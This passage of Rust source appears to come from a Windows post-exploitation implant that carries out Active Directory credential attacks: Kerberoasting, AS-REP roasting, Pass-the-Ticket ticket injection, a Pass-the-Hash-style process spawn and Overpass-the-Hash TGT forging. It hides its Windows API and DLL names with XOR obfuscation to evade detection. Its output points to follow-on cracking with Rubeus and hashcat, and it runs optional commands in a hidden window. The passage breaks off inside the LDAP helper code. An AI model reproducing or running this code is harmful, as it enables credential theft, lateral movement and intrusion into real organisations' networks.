    let fn_del  = sspi_fn!(&[0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x09,0x3F,0x39,0x2F,0x28,0x33,0x2E,
                              0x23,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x5A], DelCtxFn);
    // FreeContextBuffer
    let fn_fbuf = sspi_fn!(&[0x1C,0x28,0x3F,0x3F,0x19,0x35,0x34,0x2E,0x3F,0x22,0x2E,0x12,0x2F,
                              0x3C,0x3C,0x3F,0x28,0x5A], FreeBufFn);

    // SSPI SecBuffer / SecBufferDesc layout (manually, to avoid windows_sys SSPI structs)
    // SecBuffer:     { cb_buffer: u32, buffer_type: u32, pv_buffer: *mut u8 }
    // SecBufferDesc: { ul_version: u32, c_buffers: u32, p_buffers: *mut SecBuffer }
    // CredHandle / CtxHandle: { dw_lower: usize, dw_upper: usize }
    const SECPKG_CRED_OUTBOUND: u32 = 2;
    const ISC_REQ_ALLOCATE_MEMORY: u32 = 0x100;
    const SECURITY_NATIVE_DREP: u32 = 16;
    const SECBUFFER_TOKEN: u32 = 2;

    // "Kerberos\0" XOR 0x5A
    let kerb_pkg = crate::obfs::dec(&[0x11,0x3F,0x28,0x18,0x3F,0x28,0x35,0x29,0x5A]);
    let mut cred_hdl  = [0usize; 2];
    let mut expiry    = [0u32; 2];
    let acq_status = unsafe {
        fn_acq(core::ptr::null(), kerb_pkg.as_ptr(), SECPKG_CRED_OUTBOUND,
               core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(),
               &mut cred_hdl, &mut expiry)
    };
    if acq_status != 0 {
        return TaskOutput::failure(&format!("kerberoast: AcquireCredentialsHandle failed: {acq_status:#x}"));
    }

    let mut tickets: Vec<serde_json::Value> = Vec::new();

    for (user, spn) in &spns {
        let spn_bytes: Vec<u8> = spn.bytes().chain(core::iter::once(0u8)).collect();

        // SecBuffer x64 layout: cbBuffer(u32+4pad) + BufferType(u32+4pad) + pvBuffer(ptr) = 16 bytes
        // Actually: cbBuffer(4), BufferType(4), pvBuffer(8) — no padding between u32 fields
        let mut tok_buf = [0u8; 16usize]; // SecBuffer: cb(4) + type(4) + ptr(8)
        let tok_cb_slot   = tok_buf.as_mut_ptr() as *mut u32;
        let tok_type_slot = unsafe { tok_buf.as_mut_ptr().add(4) as *mut u32 };
        let tok_ptr_slot  = unsafe { tok_buf.as_mut_ptr().add(8) as *mut *mut u8 };
        unsafe {
            *tok_cb_slot   = 0;
            *tok_type_slot = SECBUFFER_TOKEN;
            *tok_ptr_slot  = core::ptr::null_mut();
        }

        // SecBufferDesc x64: ulVersion(4) + cBuffers(4) + pBuffers(8) = 16 bytes
        let mut out_desc = [0u8; 16usize];
        unsafe {
            *(out_desc.as_mut_ptr() as *mut u32)        = 0; // SECBUFFER_VERSION
            *(out_desc.as_mut_ptr().add(4) as *mut u32) = 1; // 1 buffer
            *(out_desc.as_mut_ptr().add(8) as *mut *mut u8) = tok_buf.as_mut_ptr();
        }

        let mut ctx_hdl   = [0usize; 2];
        let mut ctx_attrs = 0u32;

        let isc_status: i32 = unsafe {
            fn_isc(
                &mut cred_hdl,
                core::ptr::null_mut(),
                spn_bytes.as_ptr(),
                ISC_REQ_ALLOCATE_MEMORY,
                0,
                SECURITY_NATIVE_DREP,
                core::ptr::null(),
                0,
                &mut ctx_hdl,
                out_desc.as_mut_ptr(),
                &mut ctx_attrs,
                &mut expiry,
            )
        };

        // Success if non-negative (SEC_E_OK=0, SEC_I_CONTINUE_NEEDED=0x90312, etc.)
        if isc_status >= 0 {
            let tok_ptr  = unsafe { *tok_ptr_slot };
            let tok_size = unsafe { *tok_cb_slot };
            if !tok_ptr.is_null() && tok_size > 0 {
                let tok_bytes = unsafe { core::slice::from_raw_parts(tok_ptr, tok_size as usize) };
                let b64 = base64::engine::general_purpose::STANDARD.encode(tok_bytes);
                tickets.push(serde_json::json!({
                    "user":      user,
                    "spn":       spn,
                    "token_b64": b64,
                    "note":      "AP-REQ; pipe through kirbi2hashcat.py for hashcat mode 13100"
                }));
                unsafe { fn_fbuf(tok_ptr) };
            }
            unsafe { fn_del(&mut ctx_hdl) };
        }
    }

    unsafe { fn_free(&mut cred_hdl) };

    let out = serde_json::to_vec(&serde_json::json!({
        "dc":      logon_server.trim_start_matches('\\'),
        "domain":  domain_fqdn,
        "tickets": tickets
    })).unwrap_or_default();
    TaskOutput::success(out)
}

// ── AS-REP roasting ───────────────────────────────────────────────────────────
//
// Enumerates users with "Do not require Kerberos preauthentication"
// (userAccountControl bit 0x400000 = 4194304).  Returns a list for offline
// cracking; use Rubeus/Impacket to send the actual AS-REQ and capture hashes.
//
// Output: {"domain":"...", "vulnerable_users":["user1","user2",...], "count":N}

#[cfg(target_os = "windows")]
fn cred_asrep_roast(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string())
        .unwrap_or_else(|| std::env::var("USERDNSDOMAIN").unwrap_or_default());
    let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
    if domain_fqdn.is_empty() {
        return TaskOutput::failure("asrep-roast: USERDNSDOMAIN not set; pass domain arg");
    }
    if dc_arg.is_none() && logon_server.is_empty() {
        return TaskOutput::failure("asrep-roast: LOGONSERVER not set; pass dc arg");
    }
    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
    let dc = dc_owned.as_str();
    let base_dn: String = domain_fqdn.split('.').map(|p| format!("DC={}", p.to_lowercase()))
        .collect::<Vec<_>>().join(",");

    // LDAP query: users with DONT_REQUIRE_PREAUTH bit set
    let users = match ldap_query_users(dc, &base_dn,
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!objectClass=computer))",
        "sAMAccountName")
    {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("asrep-roast: {e}")),
    };

    let count = users.len();
    let out = serde_json::to_vec(&serde_json::json!({
        "domain":           domain_fqdn,
        "dc":               dc,
        "vulnerable_users": users,
        "count":            count,
        "next_step":        format!("rubeus.exe asreproast /domain:{domain_fqdn} /dc:{dc} /format:hashcat /outfile:hashes.txt")
    })).unwrap_or_default();
    TaskOutput::success(out)
}

// ── Pass-the-Ticket ───────────────────────────────────────────────────────────
//
// Injects a base64-encoded Kerberos ticket (.kirbi format) into the current
// logon session via LsaCallAuthenticationPackage(KerbSubmitTicketMessage).
// Source tickets: from lsass-dump → pypykatz, Rubeus dump, or OPTH output.
//
// Args: {"ticket_b64":"<base64 .kirbi>"[, "purge":true]}

#[cfg(target_os = "windows")]
fn cred_ptt(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let ticket_b64 = match v.get("ticket_b64").and_then(|s| s.as_str()) {
        Some(s) => s,
        None    => return TaskOutput::failure("ptt: missing ticket_b64"),
    };
    let purge = v.get("purge").and_then(|b| b.as_bool()).unwrap_or(false);

    let ticket_bytes = match base64::engine::general_purpose::STANDARD.decode(ticket_b64) {
        Ok(b)  => b,
        Err(e) => return TaskOutput::failure(&format!("ptt: base64 decode: {e}")),
    };

    let secur32 = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as usize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x29,0x3F,0x39,0x2F,0x28,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
        }
        if base == 0 { return TaskOutput::failure("ptt: secur32 not found"); }
        base
    };

    type LsaConnFn  = unsafe extern "system" fn(*mut isize) -> i32;
    type LsaLookFn  = unsafe extern "system" fn(isize, *const u8, *mut u32) -> i32;
    type LsaCallFn  = unsafe extern "system" fn(isize, u32, *const u8, u32, *mut *mut u8, *mut u32, *mut i32) -> i32;
    type LsaFreeFn  = unsafe extern "system" fn(*mut u8) -> i32;

    // secur32.dll only has forwarded exports for LSA fns on Vista+; get_export_by_name
    // doesn't follow forwarders, so always target sspicli.dll directly.
    // sspicli.dll XOR 0x5A = [0x29,0x29,0x2A,0x33,0x39,0x36,0x33,0x74,0x3E,0x36,0x36,0x5A]
    let lsa_lib = {
        let sspicli_name = crate::obfs::dec(&[0x29,0x29,0x2A,0x33,0x39,0x36,0x33,0x74,0x3E,0x36,0x36,0x5A]);
        let mut sspi = crate::loader::get_module_base(sspicli_name.as_ptr()) as usize;
        if sspi == 0 {
            sspi = unsafe { LoadLibraryA(sspicli_name.as_ptr()) } as usize;
        }
        if sspi == 0 {
            return TaskOutput::failure(&format!("ptt: sspicli not found (secur32={secur32:#x})"));
        }
        sspi
    };

    macro_rules! lsa_fn { ($name:expr, $enc:expr, $ty:ty) => { {
        let p = unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec($enc).as_ptr()) }
            .or_else(|| unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec($enc).as_ptr()) });
        match p {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure(&format!("ptt: {} not found", $name)),
        }
    }}}

    // LsaConnectUntrusted
    let fn_connect = lsa_fn!("LsaConnectUntrusted",
                              &[0x16,0x29,0x3B,0x19,0x35,0x34,0x34,0x3F,0x39,0x2E,0x0F,0x34,
                                0x2E,0x28,0x2F,0x29,0x2E,0x3F,0x3E,0x5A], LsaConnFn);
    // LsaLookupAuthenticationPackage
    let fn_lookup  = lsa_fn!("LsaLookupAuthenticationPackage",
                              &[0x16,0x29,0x3B,0x16,0x35,0x35,0x31,0x2F,0x2A,0x1B,0x2F,0x2E,
                                0x32,0x3F,0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,
                                0x3B,0x39,0x31,0x3B,0x3D,0x3F,0x5A], LsaLookFn);
    // LsaCallAuthenticationPackage
    let fn_call    = lsa_fn!("LsaCallAuthenticationPackage",
                              &[0x16,0x29,0x3B,0x19,0x3B,0x36,0x36,0x1B,0x2F,0x2E,0x32,0x3F,
                                0x34,0x2E,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,0x0A,0x3B,0x39,
                                0x31,0x3B,0x3D,0x3F,0x5A], LsaCallFn);
    // LsaFreeReturnBuffer — optional; resp_ptr is null for inject/purge so free is never called
    let fn_free_opt: Option<LsaFreeFn> = {
        let enc = &[0x16u8,0x29,0x3B,0x1C,0x28,0x3F,0x3F,0x12,0x3F,0x2E,0x2F,0x28,
                    0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A];
        unsafe { crate::loader::get_export_by_name(lsa_lib, crate::obfs::dec(enc).as_ptr()) }
            .or_else(|| unsafe { crate::loader::get_export_by_name(secur32, crate::obfs::dec(enc).as_ptr()) })
            .map(|p| unsafe { core::mem::transmute::<_, LsaFreeFn>(p) })
    };

    let mut lsa_hdl: isize = 0;
    let status = unsafe { fn_connect(&mut lsa_hdl) };
    if status != 0 {
        return TaskOutput::failure(&format!("ptt: LsaConnectUntrusted: {status:#x}"));
    }

    // LSA_STRING for package name: { Length: u16, MaximumLength: u16, Buffer: *mut u8 }
    // "Kerberos\0" (no null for LSA_STRING — it uses length fields)
    let pkg_name = b"Kerberos";
    let mut lsa_str = [0u8; 16]; // Length(2) + MaxLen(2) + pad(4) + Buffer(8)
    unsafe {
        *(lsa_str.as_mut_ptr() as *mut u16)        = pkg_name.len() as u16;
        *(lsa_str.as_mut_ptr().add(2) as *mut u16) = pkg_name.len() as u16;
        *(lsa_str.as_mut_ptr().add(8) as *mut *const u8) = pkg_name.as_ptr();
    }

    let mut auth_pkg_id: u32 = 0;
    let status2 = unsafe { fn_lookup(lsa_hdl, lsa_str.as_ptr(), &mut auth_pkg_id) };
    if status2 != 0 {
        return TaskOutput::failure(&format!("ptt: LsaLookupAuthenticationPackage: {status2:#x}"));
    }

    // Optionally purge first (KerbPurgeTicketCacheMessage = 6)
    if purge {
        // KERB_PURGE_TKT_CACHE_REQUEST: msg_type(4) + luid_low(4) + luid_high(4) + pad(4) = 16 bytes
        let mut purge_req = [0u8; 16];
        purge_req[0] = 6; // KerbPurgeTicketCacheMessage
        let mut resp_ptr: *mut u8 = core::ptr::null_mut();
        let mut resp_len: u32 = 0;
        let mut sub_status: i32 = 0;
        unsafe {
            fn_call(lsa_hdl, auth_pkg_id, purge_req.as_ptr(), 16,
                    &mut resp_ptr, &mut resp_len, &mut sub_status);
            if !resp_ptr.is_null() { if let Some(f) = fn_free_opt { f(resp_ptr); } }
        }
    }

    // KerbSubmitTicketMessage = 21 (0x15)
    // KERB_SUBMIT_TKT_REQUEST layout (no padding since all u32 fields):
    //   msg_type(4) + luid_low(4) + luid_high(4) + flags(4) +
    //   key_type(4) + key_length(4) + key_offset(4) +
    //   kerb_cred_size(4) + kerb_cred_offset(4)  = 36 bytes header
    //   + ticket_bytes immediately after
    let hdr_size = 36usize;
    let total = hdr_size + ticket_bytes.len();
    let mut req = vec![0u8; total];
    unsafe {
        let p = req.as_mut_ptr();
        *(p       as *mut u32) = 21;                          // KerbSubmitTicketMessage
        // luid = {0,0} = current user
        *(p.add(8) as *mut u32) = 0;                          // flags
        // KERB_CRYPTO_KEY32 at +12: {type=0, length=0, offset=0}
        *(p.add(24) as *mut u32) = ticket_bytes.len() as u32; // KerbCredSize
        *(p.add(28) as *mut u32) = hdr_size as u32;           // KerbCredOffset
        // copy ticket immediately after header
        core::ptr::copy_nonoverlapping(ticket_bytes.as_ptr(), p.add(hdr_size), ticket_bytes.len());
    }

    let mut resp_ptr: *mut u8 = core::ptr::null_mut();
    let mut resp_len: u32 = 0;
    let mut sub_status: i32 = 0;
    let call_status = unsafe {
        fn_call(lsa_hdl, auth_pkg_id, req.as_ptr(), total as u32,
                &mut resp_ptr, &mut resp_len, &mut sub_status)
    };
    if !resp_ptr.is_null() { unsafe { if let Some(f) = fn_free_opt { f(resp_ptr); } } }

    if call_status != 0 || sub_status != 0 {
        TaskOutput::failure(&format!(
            "ptt: LsaCallAuthenticationPackage: call={call_status:#x} sub={sub_status:#x}"
        ))
    } else {
        TaskOutput::success(b"ptt: ticket injected into current logon session".to_vec())
    }
}

// ── Pass-the-Hash ─────────────────────────────────────────────────────────────
//
// Spawns a process using network-only credentials (LOGON_NETCREDENTIALS_ONLY),
// which uses the provided user/domain/password for outbound network connections
// while keeping the local logon context unchanged.
//
// NOTE: True PTH (injecting an NTLM hash without cracking) requires either:
//   a) SYSTEM privileges to patch LSASS logon session credentials, OR
//   b) Converting the hash to a Kerberos TGT (Overpass-the-Hash via cred/opth)
// This function provides the "spawn in user context" half — use cred/opth to
// obtain the TGT first, then spawn via cred/pth with cleartext or via PTT+shell.
//
// Args: {"domain":"...", "user":"...", "pass":"...", "cmd":"..."}

#[cfg(target_os = "windows")]
fn cred_pth(v: &serde_json::Value) -> TaskOutput {
    let domain = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");
    let user   = match v.get("user").and_then(|s| s.as_str()) {
        Some(u) => u,
        None    => return TaskOutput::failure("pth: missing user"),
    };
    let pass = match v.get("pass").and_then(|s| s.as_str()) {
        Some(p) => p,
        None    => return TaskOutput::failure("pth: missing pass (use cleartext or 'x' placeholder; true hash injection requires cred/opth + elevation)"),
    };
    let cmd = v.get("cmd").and_then(|s| s.as_str()).unwrap_or("cmd.exe");

    let adv = crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    ) as usize;
    if adv == 0 { return TaskOutput::failure("pth: advapi32 not found"); }

    type CreateProcFn = unsafe extern "system" fn(
        *const u16, *const u16, *const u16, u32,
        *const u16, *mut u16,
        u32, *const u8, *const u16,
        *const u8, *mut u8,
    ) -> i32;

    let fn_create = match unsafe {
        crate::loader::get_export_by_name(adv,
            // CreateProcessWithLogonW
            crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,
                               0x29,0x0D,0x33,0x2E,0x32,0x16,0x35,0x3D,0x35,0x34,0x0D,0x5A])
            .as_ptr()
        )
    } {
        Some(p) => unsafe { core::mem::transmute::<_, CreateProcFn>(p) },
        None    => return TaskOutput::failure("pth: CreateProcessWithLogonW not found"),
    };

    let to_wide = |s: &str| -> Vec<u16> { s.encode_utf16().chain(core::iter::once(0u16)).collect() };
    let w_user   = to_wide(user);
    let w_domain = to_wide(domain);
    let w_pass   = to_wide(pass);
    let mut w_cmd: Vec<u16> = cmd.encode_utf16().chain(core::iter::once(0u16)).collect();

    let mut si = [0u8; 104usize]; si[0] = 104;
    let mut pi = [0u8; 24usize];
    const LOGON_NETCREDENTIALS_ONLY: u32 = 2;
    const CREATE_NEW_CONSOLE: u32 = 0x10;

    let ok = unsafe {
        fn_create(
            w_user.as_ptr(), w_domain.as_ptr(), w_pass.as_ptr(),
            LOGON_NETCREDENTIALS_ONLY,
            core::ptr::null::<u16>(), w_cmd.as_mut_ptr(),
            CREATE_NEW_CONSOLE,
            core::ptr::null::<u8>(), core::ptr::null::<u16>(),
            si.as_ptr(), pi.as_mut_ptr(),
        )
    };

    if ok == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        return TaskOutput::failure(&format!("pth: CreateProcessWithLogonW failed: {err:#010x}"));
    }

    let pid = u32::from_ne_bytes([pi[16], pi[17], pi[18], pi[19]]);
    TaskOutput::success(
        serde_json::to_vec(&serde_json::json!({
            "pid":    pid,
            "user":   format!("{domain}\\{user}"),
            "cmd":    cmd,
            "status": "spawned (LOGON_NETCREDENTIALS_ONLY; outbound network auth uses provided creds)"
        })).unwrap_or_default()
    )
}

// ── Overpass-the-Hash ─────────────────────────────────────────────────────────
//
// Converts an NTLM hash into a Kerberos TGT (AS-REQ with RC4-HMAC preauth)
// and injects it via LsaCallAuthenticationPackage, enabling lateral movement
// without cracking the hash or needing a cleartext password.
//
// Requires: elevated privileges (SeImpersonatePrivilege or SYSTEM) to create a
//           new logon session; the NT hash is the RC4 key for the AS-REQ.
//
// Args: {"domain":"...", "user":"...", "ntlm":"<32-char hex>", ["cmd":"..."]}

#[cfg(target_os = "windows")]
fn cred_opth(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    let domain = match v.get("domain").and_then(|s| s.as_str()) {
        Some(d) => d,
        None    => return TaskOutput::failure("opth: missing domain"),
    };
    let user = match v.get("user").and_then(|s| s.as_str()) {
        Some(u) => u,
        None    => return TaskOutput::failure("opth: missing user"),
    };
    let ntlm_hex = match v.get("ntlm").and_then(|s| s.as_str()) {
        Some(h) if h.len() == 32 => h,
        Some(_) => return TaskOutput::failure("opth: ntlm must be 32-char hex NT hash"),
        None    => return TaskOutput::failure("opth: missing ntlm"),
    };

    // Decode NT hash (16 bytes, RC4 key for Kerberos RC4-HMAC)
    let rc4_key: Vec<u8> = (0..16)
        .map(|i| u8::from_str_radix(&ntlm_hex[i*2..i*2+2], 16).unwrap_or(0))
        .collect();

    // Get domain controller — prefer dc arg, fall back to LOGONSERVER env var
    let logon_server = std::env::var("LOGONSERVER").unwrap_or_default();
    let domain_fqdn  = std::env::var("USERDNSDOMAIN").unwrap_or_default();
    let dc_arg = v.get("dc").and_then(|s| s.as_str()).map(|s| s.to_string());
    if dc_arg.is_none() && logon_server.is_empty() {
        return TaskOutput::failure("opth: LOGONSERVER not set; pass dc arg");
    }
    let dc_owned = dc_arg.unwrap_or_else(|| logon_server.trim_start_matches('\\').to_string());
    let dc = dc_owned.as_str();

    // Build a minimal Kerberos AS-REQ (no preauthentication first; if rejected, add PA-ENC-TS)
    // ASN.1 helper closures
    let asn1_len = |n: usize| -> Vec<u8> {
        if n < 128 { vec![n as u8] }
        else if n < 256 { vec![0x81, n as u8] }
        else { vec![0x82, (n >> 8) as u8, n as u8] }
    };
    let asn1_wrap = |tag: u8, content: &[u8]| -> Vec<u8> {
        let mut v = vec![tag];
        v.extend(asn1_len(content.len()));
        v.extend_from_slice(content);
        v
    };
    let asn1_int = |n: i64| -> Vec<u8> {
        let bytes = n.to_be_bytes();
        let skip = bytes.iter().take_while(|&&b| b == 0).count().min(7);
        asn1_wrap(0x02, &bytes[skip..])
    };
    let asn1_seq  = |c: &[u8]| asn1_wrap(0x30, c);
    let asn1_ctx  = |tag: u8, c: &[u8]| asn1_wrap(0xa0 | tag, c);
    let asn1_gstr = |s: &str| asn1_wrap(0x1b, s.as_bytes()); // GeneralString
    let asn1_ostr = |b: &[u8]| asn1_wrap(0x04, b);
    let asn1_bstr = |b: &[u8]| -> Vec<u8> { // BIT STRING: 0x03 len 0x00 data
        let mut v = vec![0x03];
        v.extend(asn1_len(b.len() + 1));
        v.push(0x00);
        v.extend_from_slice(b);
        v
    };

    // EncryptedData with RC4-HMAC(23): encrypt a timestamp
    // PA-ENC-TS-ENC ::= SEQUENCE { patimestamp KerberosTime, pausec INTEGER }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    // KerberosTime is GeneralizedTime: "YYYYMMDDHHmmssZ"
    let ts = {
        let secs = now;
        let s = secs % 60; let secs = secs / 60;
        let m = secs % 60; let secs = secs / 60;
        let h = secs % 24; let days = secs / 24;
        let (y, mo, d) = days_to_ymd(days as u32);
        format!("{y:04}{mo:02}{d:02}{h:02}{m:02}{s:02}Z")
    };
    let ts_enc_plain = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(0, &asn1_gstr(&ts)));
        s.extend(asn1_ctx(1, &asn1_int(0)));
        asn1_seq(&s)
    };

    // RC4-HMAC encrypt the timestamp (Kerberos usage 1 = AS-REQ timestamp)
    let enc_ts = rc4_hmac_encrypt(&rc4_key, &ts_enc_plain, 1);
    // EncryptedData ::= SEQUENCE { etype[0] Int32, cipher[2] OCTET STRING }
    let enc_data = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(0, &asn1_int(23))); // etype = RC4-HMAC
        s.extend(asn1_ctx(2, &asn1_ostr(&enc_ts)));
        asn1_seq(&s)
    };
    // PA-ENC-TIMESTAMP padata
    let pa_enc_ts = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(1, &asn1_int(2)));       // padata-type = 2
        s.extend(asn1_ctx(2, &asn1_ostr(&enc_data)));
        asn1_seq(&s)
    };
    let padata = asn1_seq(&pa_enc_ts);

    // KDC-REQ-BODY
    let nonce: u32 = (now & 0xFFFFFFFF) as u32;
    let domain_upper = domain.to_uppercase();
    let req_body = {
        let mut s = Vec::new();
        // kdc-options [0]: FORWARDABLE|RENEWABLE|CANONICALIZE|RENEWABLE-OK = 0x40810010
        let opts: u32 = 0x40810010u32;
        s.extend(asn1_ctx(0, &asn1_bstr(&opts.to_be_bytes())));
        // cname [1]: PrincipalName = NT-PRINCIPAL(1), user
        let cname = {
            let mut p = Vec::new();
            p.extend(asn1_ctx(0, &asn1_int(1))); // NT-PRINCIPAL
            p.extend(asn1_ctx(1, &asn1_seq(&asn1_gstr(user))));
            asn1_seq(&p)
        };
        s.extend(asn1_ctx(1, &cname));
        // realm [2]
        s.extend(asn1_ctx(2, &asn1_gstr(&domain_upper)));
        // sname [3]: krbtgt/DOMAIN
        let sname = {
            let mut p = Vec::new();
            p.extend(asn1_ctx(0, &asn1_int(2))); // NT-SRV-INST
            let parts = {
                let mut sv = Vec::new();
                sv.extend(asn1_gstr("krbtgt"));
                sv.extend(asn1_gstr(&domain_upper));
                sv
            };
            p.extend(asn1_ctx(1, &asn1_seq(&parts)));
            asn1_seq(&p)
        };
        s.extend(asn1_ctx(3, &sname));
        // till [5]: 20370913024805Z (no expiry)
        s.extend(asn1_ctx(5, &asn1_gstr("20370913024805Z")));
        // nonce [7]
        s.extend(asn1_ctx(7, &asn1_int(nonce as i64)));
        // etype [8]: RC4-HMAC(23)
        s.extend(asn1_ctx(8, &asn1_seq(&asn1_int(23))));
        asn1_seq(&s)
    };

    // KDC-REQ ::= SEQUENCE { pvno[1], msg-type[2], padata[3] OPTIONAL, req-body[4] }
    let kdc_req = {
        let mut s = Vec::new();
        s.extend(asn1_ctx(1, &asn1_int(5))); // pvno = 5
        s.extend(asn1_ctx(2, &asn1_int(10))); // AS-REQ = 10
        s.extend(asn1_ctx(3, &padata));
        s.extend(asn1_ctx(4, &req_body));
        asn1_seq(&s)
    };
    // AS-REQ = APPLICATION 10
    let as_req = asn1_wrap(0x6a, &kdc_req);

    // Send AS-REQ to DC:88 via UDP, read AS-REP
    let dc_addr = format!("{dc}:88");
    let as_rep = match krb_udp_exchange(&dc_addr, &as_req) {
        Ok(r)  => r,
        Err(e) => return TaskOutput::failure(&format!("opth: KDC exchange failed: {e}")),
    };

    // Parse AS-REP to extract TGT and session key
    // AS-REP = APPLICATION 11 (0x6b) → KDC-REP SEQUENCE
    // We need the enc-part (position [6]) decrypted with session key,
    // and the ticket (position [5]) which goes into the cache.
    // For PTT, we just inject the whole reply as KERB-CRED.
    // Build a minimal KERB-CRED from the AS-REP ticket for LsaCallAuthenticationPackage.
    // Simplest approach: inject the raw AS-REP ticket via cred_ptt helper.
    if as_rep.len() < 10 {
        return TaskOutput::failure("opth: empty or truncated AS-REP");
    }
    if as_rep[0] != 0x6b {
        // KRB5-ERROR = 0x7e
        let err_code = parse_krb_error_code(&as_rep);
        return TaskOutput::failure(&format!("opth: KDC returned error: {err_code:#x}"));
    }

    // Extract ticket from AS-REP and wrap in KERB-CRED for injection
    let kirbi = build_kerb_cred_from_as_rep(&as_rep, user, &domain_upper, nonce, &rc4_key);
    match kirbi {
        Ok(kb) => {
            // Inject via PTT mechanism
            let ticket_b64 = base64::engine::general_purpose::STANDARD.encode(&kb);
            let ptt_args = serde_json::json!({"ticket_b64": ticket_b64});
            let ptt_result = cred_ptt(&ptt_args);
            let cmd = v.get("cmd").and_then(|s| s.as_str());
            let mut resp = serde_json::json!({
                "user":       format!("{domain}\\{user}"),
                "status":     "TGT obtained and injected",
                "ticket_b64": ticket_b64
            });
            if let Some(c) = cmd {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x08000000;
                if let Ok(o) = std::process::Command::new("cmd").args(["/C", c])
                    .creation_flags(CREATE_NO_WINDOW).output()
                {
                    let mut out = o.stdout;
                    out.extend_from_slice(&o.stderr);
                    resp["cmd_output"] = serde_json::Value::String(
                        String::from_utf8_lossy(&out).to_string()
                    );
                }
            }
            TaskOutput::success(serde_json::to_vec(&resp).unwrap_or_default())
        }
        Err(e) => TaskOutput::failure(&format!("opth: parse AS-REP: {e}")),
    }
}

// ─── LDAP helpers ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn ldap_enum_spns(dc: &str, base_dn: &str) -> Result<Vec<(String, String)>, String> {
    // Returns Vec of (sAMAccountName, servicePrincipalName) pairs
    let raw = ldap_query_two_attrs(dc, base_dn,
        "(&(objectClass=user)(servicePrincipalName=*)(!objectClass=computer))",
        "sAMAccountName", "servicePrincipalName")?;
    Ok(raw)
}

#[cfg(target_os = "windows")]
fn ldap_query_users(dc: &str, base_dn: &str, filter: &str, attr: &str) -> Result<Vec<String>, String> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let wldap = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as usize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as usize;
        }
        if base == 0 { return Err("Wldap32 not found".into()); }
        base
    };

    type LdapInitFn     = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn   = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn     = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn   = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn    = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn     = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetValsFn  = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapValFreeFn  = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn  = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn   = unsafe extern "system" fn(*mut u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => { {
        let _n = crate::obfs::dec($enc);
        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
        match _p {
            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
            None    => return Err("wldap fn resolve failed".into()),
        }
    }}}

    let fn_init      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
